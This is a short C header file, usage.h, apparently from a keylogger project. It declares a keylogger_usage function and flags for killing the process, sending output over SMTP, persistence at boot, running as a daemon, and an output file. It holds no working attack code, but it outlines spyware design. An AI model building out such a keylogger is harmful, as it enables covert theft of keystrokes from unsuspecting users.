#ifndef USAGE_H
#define USAGE_H

#include <stdio.h>
#include <unistd.h>
#include <getopt.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>

int keylogger_usage(int argc, char **argv);
extern int flag_kill;
extern int flag_smtp;
extern int flag_status;
extern int smtp_status;
extern int no_bootable;
extern int no_daemon;
extern char outfile[200];

#endif
